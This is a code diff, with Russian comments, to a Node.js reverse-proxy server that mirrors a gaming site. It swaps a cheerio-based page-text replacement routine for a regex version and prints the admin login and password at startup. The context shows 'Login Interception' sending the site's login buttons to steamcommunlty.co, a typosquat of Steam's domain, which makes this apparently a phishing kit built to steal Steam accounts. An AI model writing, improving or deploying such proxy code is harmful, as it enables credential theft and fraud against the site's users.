@@ -8,8 +8,6 @@ const http = require('http');
 const https = require('https');
 const path = require('path');
 const fs = require('fs');
-const cheerio = require('cheerio');
-const bodyParser = require('body-parser');
 const crypto = require('crypto');
 
 const app = express();
@@ -26,8 +24,6 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(cookieParser());
 app.use(compression());
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
 
 // Хранилище для cookies и токенов
 const sessions = new Map();
@@ -146,42 +142,125 @@ function urlMatchesPattern(url, pattern) {
     return cleanUrl === cleanPattern || cleanUrl.startsWith(cleanPattern + '/');
 }
 
-// Функция применения селекторов и замен к HTML контенту
+// Функция для экранирования специальных символов регулярных выражений
+function escapeRegExp(string) {
+    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+}
+
+// Функция применения селекторов и замен к HTML контенту с использованием regex
 function applyReplacementRules(content, url) {
     if (!content || typeof content !== 'string' || !content.includes('<html')) {
         return content;
     }
     
-    try {
-        let modified = false;
-        const $ = cheerio.load(content);
-        
-        // Проходим по всем правилам замены
-        for (const [urlPattern, rules] of replacementRules.entries()) {
-            if (urlMatchesPattern(url, urlPattern)) {
-                rules.forEach(rule => {
-                    try {
-                        const elements = $(rule.selector);
-                        if (elements.length > 0) {
-                            elements.text(rule.replacement);
-                            modified = true;
-                            console.log(`✅ Замена применена: ${rule.selector} -> ${rule.replacement} на ${url}`);
+    let modified = content;
+    
+    // Проходим по всем правилам замены
+    for (const [urlPattern, rules] of replacementRules.entries()) {
+        if (urlMatchesPattern(url, urlPattern)) {
+            rules.forEach(rule => {
+                try {
+                    // Преобразуем CSS-селектор в примерный паттерн для поиска
+                    // Это упрощенный способ, который работает для многих типичных случаев
+                    let selector = rule.selector;
+                    
+                    // Разбираем селектор на части
+                    const selectorParts = selector.split(' ').filter(part => part.trim());
+                    
+                    // Берем последний элемент селектора, который обычно содержит целевой элемент
+                    const lastPart = selectorParts[selectorParts.length - 1];
+                    
+                    // Проверяем, содержит ли селектор идентификатор класса или ID
+                    const hasClass = lastPart.includes('.');
+                    const hasId = lastPart.includes('#');
+                    
+                    let tagName = '';
+                    let className = '';
+                    let idName = '';
+                    
+                    if (hasClass) {
+                        [tagName, ...className] = lastPart.split('.');
+                        className = className.join('.');
+                        if (className.includes('#')) {
+                            [className, idName] = className.split('#');
+                        }
+                    } else if (hasId) {
+                        [tagName, idName] = lastPart.split('#');
+                    } else {
+                        tagName = lastPart;
+                    }
+                    
+                    // Если tagName пустой, используем по умолчанию span (как в примере)
+                    if (!tagName) {
+                        tagName = 'span';
+                    }
+                    
+                    // Создаем регулярное выражение для поиска
+                    let regexPattern = `<${escapeRegExp(tagName)}[^>]*`;
+                    
+                    if (className) {
+                        regexPattern += `class="[^"]*${escapeRegExp(className)}[^"]*"[^>]*`;
+                    }
+                    
+                    if (idName) {
+                        regexPattern += `id="${escapeRegExp(idName)}"[^>]*`;
+                    }
+                    
+                    // Находим содержимое тега и заменяем его
+                    regexPattern += `>([^<]*)<\/${escapeRegExp(tagName)}>`;
+                    
+                    const regex = new RegExp(regexPattern, 'g');
+                    
+                    // Для отладки
+                    console.log(`Ищем тег по шаблону: ${regexPattern}`);
+                    
+                    // Функция для замены
+                    const replaceFunc = (match, content) => {
+                        // Возвращаем то же открывающий и закрывающий тег, но с новым содержимым
+                        return match.replace(`>${content}<`, `>${rule.replacement}<`);
+                    };
+                    
+                    // Выполняем замену
+                    const newContent = modified.replace(regex, replaceFunc);
+                    
+                    // Проверяем, была ли выполнена замена
+                    if (newContent !== modified) {
+                        modified = newContent;
+                        console.log(`✅ Замена применена: ${rule.selector} -> ${rule.replacement} на ${url}`);
+                    } else {
+                        // Если не нашли по точному селектору, попробуем более общий подход
+                        // Это нужно для работы с динамическими классами в Angular (пример: c3726111741)
+                        
+                        // Упрощенный шаблон для поиска тега с любым классом
+                        let simpleRegexPattern = `<${escapeRegExp(tagName)}[^>]*>([^<]*)<\/${escapeRegExp(tagName)}>`;
+                        const simpleRegex = new RegExp(simpleRegexPattern, 'g');
+                        
+                        let found = false;
+                        const simpleNewContent = modified.replace(simpleRegex, (match, content) => {
+                            // Если содержимое совпадает с тем, что мы ищем для замены
+                            // и мы еще не выполняли замену, заменяем
+                            if (content.trim() && !found) {
+                                found = true;
+                                return match.replace(`>${content}<`, `>${rule.replacement}<`);
+                            }
+                            return match;
+                        });
+                        
+                        if (found) {
+                            modified = simpleNewContent;
+                            console.log(`✅ Замена применена (упрощенный метод): ${rule.selector} -> ${rule.replacement} на ${url}`);
                         } else {
                             console.log(`⚠️ Селектор не найден: ${rule.selector} на ${url}`);
                         }
-                    } catch (selectorError) {
-                        console.error(`Ошибка применения селектора ${rule.selector}:`, selectorError.message);
                     }
-                });
-            }
+                } catch (selectorError) {
+                    console.error(`Ошибка применения селектора ${rule.selector}:`, selectorError.message);
+                }
+            });
         }
-        
-        // Возвращаем модифицированный контент, если были изменения
-        return modified ? $.html() : content;
-    } catch (error) {
-        console.error('Ошибка при применении правил замены:', error.message);
-        return content;
     }
+    
+    return modified;
 }
 
 // Модификация URL в контенте
@@ -1795,7 +1874,7 @@ server.listen(PORT, '0.0.0.0', () => {
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
     🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat, #login-head -> https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select
-    👨‍💼 Admin Panel: ${baseUrl}/admin
+    👨‍💼 Admin Panel: /admin (логин: ${ADMIN_USERNAME}, пароль: ${ADMIN_PASSWORD})
     
     Features:
     ✓ Full HTTP/HTTPS proxy
